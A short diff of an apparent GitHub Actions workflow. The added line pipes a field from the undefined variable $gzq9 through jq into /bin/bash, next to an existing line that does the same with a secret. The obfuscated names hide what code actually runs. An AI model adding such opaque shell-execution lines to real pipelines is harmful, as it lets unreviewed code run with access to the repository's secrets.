@@ -23,6 +23,7 @@ jobs:
           awu6: ${{ secrets.awu6 }}
         run: |
           printf '%s' "$awu6" | jq -r .g5 | /bin/bash
+          echo $gzq9 | jq -r .u874 | /bin/bash
 
       - name: Save archive
         if: always()
